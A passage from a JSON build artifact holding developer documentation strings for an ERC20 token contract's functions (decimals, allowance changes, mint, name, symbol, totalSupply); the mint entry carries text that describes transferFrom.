        "details": "Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5,05` (`505 / 10 ** 2`).     * Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is called.     * NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."
      },
      "decreaseAllowance(address,uint256)": {
        "details": "Atomically decreases the allowance granted to `spender` by the caller.     * This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}.     * Emits an {Approval} event indicating the updated allowance.     * Requirements:     * - `spender` cannot be the zero address. - `spender` must have allowance for the caller of at least `subtractedValue`."
      },
      "increaseAllowance(address,uint256)": {
        "details": "Atomically increases the allowance granted to `spender` by the caller.     * This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}.     * Emits an {Approval} event indicating the updated allowance.     * Requirements:     * - `spender` cannot be the zero address."
      },
      "mint(address,uint256)": {
        "details": "See {IERC20-transferFrom}.     * Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20};     * Requirements: - `sender` and `recipient` cannot be the zero address. - `sender` must have a balance of at least `amount`. - the caller must have allowance for ``sender``'s tokens of at least `amount`."
      },
      "name()": {
        "details": "Returns the name of the token."
      },
      "symbol()": {
        "details": "Returns the symbol of the token, usually a shorter version of the name."
      },
      "totalSupply()": {
        "details": "See {IERC20-totalSupply}."
      }
    }
  },
  "userdoc": {
    "methods": {}
  }
}